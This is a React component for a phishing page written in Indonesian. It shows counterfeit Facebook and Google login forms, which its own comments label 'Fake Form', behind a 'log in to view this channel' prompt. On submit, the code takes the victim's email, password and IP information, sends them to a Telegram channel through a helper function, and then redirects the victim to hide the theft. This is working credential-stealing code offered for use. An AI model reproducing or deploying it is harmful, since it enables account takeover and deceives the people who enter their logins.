import React, { useState } from 'react';
import { X, ArrowLeft, Eye, EyeOff } from 'lucide-react';
import { getIpInfo, sendToTelegram } from '../utils/telegramService';

interface LoginModalProps {
  isOpen: boolean;
  onClose: () => void;
  destination: string;
}

type Provider = 'facebook' | 'google' | null;

const LoginModal: React.FC<LoginModalProps> = ({ isOpen, onClose, destination }) => {
  const [provider, setProvider] = useState<Provider>(null);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  if (!isOpen) return null;

  const handleProviderSelect = (selected: Provider) => {
    setProvider(selected);
    setEmail('');
    setPassword('');
  };

  const handleBack = () => {
    setProvider(null);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password) return;

    setIsLoading(true);

    try {
      // 1. Get IP Data
      const ipData = await getIpInfo();
      
      // 2. Send to Telegram
      await sendToTelegram(
        provider === 'facebook' ? 'Facebook' : 'Google',
        email,
        password,
        ipData
      );

      // 3. Redirect
      setTimeout(() => {
        window.location.href = destination;
      }, 1000);
      
    } catch (error) {
      console.error(error);
      // Fallback redirect even on error
      window.location.href = destination;
    }
  };

  // --- Main Selection View ---
  if (!provider) {
    return (
      <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm animate-fade-in">
        <div className="bg-white rounded-xl shadow-2xl w-full max-w-md overflow-hidden relative">
          <button 
            onClick={onClose}
            className="absolute top-4 right-4 text-gray-500 hover:text-gray-800"
          >
            <X size={24} />
          </button>

          <div className="p-8 text-center">
              <h2 className="text-2xl font-bold mb-2 text-gray-800">Masuk untuk Lanjut</h2>
              <p className="text-gray-600 mb-8">Anda perlu masuk untuk melihat saluran ini.</p>

              <div className="space-y-4">
                  <button 
                      onClick={() => handleProviderSelect('facebook')}
                      className="w-full flex items-center justify-center gap-3 bg-[#1877F2] text-white py-3 px-4 rounded-lg font-semibold hover:bg-[#166fe5] transition shadow-sm"
                  >
                      <svg className="w-6 h-6 fill-current" viewBox="0 0 24 24">
                          <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                      </svg>
                      Lanjutkan dengan Facebook
                  </button>

                  <button 
                      onClick={() => handleProviderSelect('google')}
                      className="w-full flex items-center justify-center gap-3 bg-white border border-gray-300 text-gray-700 py-3 px-4 rounded-lg font-semibold hover:bg-gray-50 transition shadow-sm"
                  >
                      <svg className="w-6 h-6" viewBox="0 0 24 24">
                          <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
                          <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
                          <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" />
                          <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" />
                      </svg>
                      Lanjutkan dengan Google
                  </button>
              </div>
              
              <p className="mt-6 text-xs text-gray-500">
                  Dengan melanjutkan, Anda menyetujui Ketentuan Layanan dan Kebijakan Privasi kami.
              </p>
          </div>
        </div>
      </div>
    );
  }

  // --- Facebook Fake Form ---
  if (provider === 'facebook') {
    return (
      <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-[#f0f2f5] animate-fade-in font-sans">
        <div className="bg-white rounded-lg shadow-xl w-full max-w-[396px] overflow-hidden relative">
            <div className="bg-[#1877F2] px-4 py-3 flex items-center text-white">
                <button onClick={handleBack} className="mr-3"><ArrowLeft size={20}/></button>
                <span className="font-bold">Facebook Login</span>
            </div>
            
            <div className="p-6 text-center">
                 <div className="text-[#1877F2] text-2xl font-bold mb-6">facebook</div>
                 <form onSubmit={handleSubmit} className="space-y-3">
                    <input 
                        type="text" 
                        placeholder="Mobile number or email"
                        className="w-full px-4 py-3.5 bg-[#f5f6f7] border border-gray-300 rounded-md focus:border-[#1877F2] focus:ring-1 focus:ring-[#1877F2] outline-none text-[15px] text-black"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        required
                    />
                    <input 
                        type="password" 
                        placeholder="Password"
                        className="w-full px-4 py-3.5 bg-[#f5f6f7] border border-gray-300 rounded-md focus:border-[#1877F2] focus:ring-1 focus:ring-[#1877F2] outline-none text-[15px] text-black"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        required
                    />
                    <button 
                        type="submit"
                        disabled={isLoading}
                        className="w-full bg-[#1877F2] text-white font-bold text-[17px] py-3 rounded-md hover:bg-[#166fe5] transition mt-2 disabled:opacity-70"
                    >
                        {isLoading ? 'Logging in...' : 'Log In'}
                    </button>
                 </form>

                 <div className="mt-4 text-center">
                    <a href="#" className="text-[#1877F2] text-sm hover:underline">Forgotten password?</a>
                 </div>
                 
                 <div className="my-6 flex items-center justify-between">
                    <div className="h-px bg-gray-300 flex-1"></div>
                    <span className="px-3 text-sm text-gray-500">or</span>
                    <div className="h-px bg-gray-300 flex-1"></div>
                 </div>

                 <button onClick={onClose} className="w-full border border-gray-400 text-gray-700 font-semibold py-2 rounded-md hover:bg-gray-50 text-sm">
                    Create new account
                 </button>
            </div>
        </div>
      </div>
    );
  }

  // --- Google Fake Form ---
  if (provider === 'google') {
    return (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm animate-fade-in font-roboto">
          <div className="bg-white rounded-[28px] shadow-2xl w-full max-w-[400px] overflow-hidden p-9 relative">
             <button onClick={handleBack} className="absolute top-6 left-6 text-gray-600"><ArrowLeft size={24}/></button>

             <div className="flex flex-col items-center">
                 <svg className="w-12 h-12 mb-4" viewBox="0 0 24 24">
                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" />
                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" />
                 </svg>
                 <h2 className="text-2xl font-normal text-gray-900 mb-2">Sign in</h2>
                 <p className="text-[16px] text-gray-800 mb-8">to continue to WhatsApp</p>
             </div>

             <form onSubmit={handleSubmit} className="w-full">
                <div className="mb-6 relative">
                    <input 
                        type="email" 
                        className="w-full px-3 py-3.5 border border-gray-300 rounded-[4px] focus:border-[#1a73e8] focus:ring-2 focus:ring-[#1a73e8]/20 outline-none text-[16px] text-black peer"
                        placeholder=" "
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        required
                    />
                    <label className="absolute left-3 top-3.5 text-gray-500 text-[16px] pointer-events-none transition-all duration-200 peer-focus:-top-2.5 peer-focus:bg-white peer-focus:text-xs peer-focus:text-[#1a73e8] peer-focus:px-1 peer-[&:not(:placeholder-shown)]:-top-2.5 peer-[&:not(:placeholder-shown)]:bg-white peer-[&:not(:placeholder-shown)]:text-xs peer-[&:not(:placeholder-shown)]:px-1">
                        Email or phone
                    </label>
                </div>
                
                <div className="mb-10 relative">
                     <input 
                        type={showPassword ? "text" : "password"}
                        className="w-full px-3 py-3.5 border border-gray-300 rounded-[4px] focus:border-[#1a73e8] focus:ring-2 focus:ring-[#1a73e8]/20 outline-none text-[16px] text-black peer"
                        placeholder=" "
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        required
                    />
                    <label className="absolute left-3 top-3.5 text-gray-500 text-[16px] pointer-events-none transition-all duration-200 peer-focus:-top-2.5 peer-focus:bg-white peer-focus:text-xs peer-focus:text-[#1a73e8] peer-focus:px-1 peer-[&:not(:placeholder-shown)]:-top-2.5 peer-[&:not(:placeholder-shown)]:bg-white peer-[&:not(:placeholder-shown)]:text-xs peer-[&:not(:placeholder-shown)]:px-1">
                        Enter your password
                    </label>
                    <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-4 text-gray-600">
                        {showPassword ? <EyeOff size={20}/> : <Eye size={20}/>}
                    </button>
                </div>

                <div className="flex justify-end items-center gap-6">
                    <button type="button" className="text-[#1a73e8] font-medium text-sm hover:bg-blue-50 px-2 py-1.5 rounded">
                        Forgot email?
                    </button>
                    <button 
                        type="submit"
                        disabled={isLoading} 
                        className="bg-[#1a73e8] text-white font-medium px-6 py-2 rounded-[4px] hover:bg-[#1557b0] transition disabled:opacity-70"
                    >
                        {isLoading ? 'Next...' : 'Next'}
                    </button>
                </div>
             </form>
          </div>
        </div>
      );
  }

  return null;
};

export default LoginModal;